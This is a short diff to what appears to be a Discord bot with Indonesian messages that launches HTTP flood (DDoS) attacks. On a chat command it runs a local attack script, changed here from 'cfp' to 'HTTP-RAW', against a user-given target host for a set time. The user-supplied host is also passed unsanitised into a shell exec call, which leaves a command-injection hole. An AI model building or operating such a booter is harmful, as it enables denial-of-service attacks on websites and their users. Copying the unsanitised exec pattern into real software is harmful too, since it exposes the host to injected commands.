@@ -32,7 +32,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`contoh ;cfpro target time api`")
+	.setDescription("`contoh ;http target time api`")
 	.setFooter("GUNAKAN DENGAN BIJAK OKH!!!")
 	message.channel.send(embed1);
 	return;
@@ -72,7 +72,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cfp ${host} 40 100 GET ${time}`, (error, stdout, stderr) => {
+exec(`node HTTP-RAW ${host} ${time}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
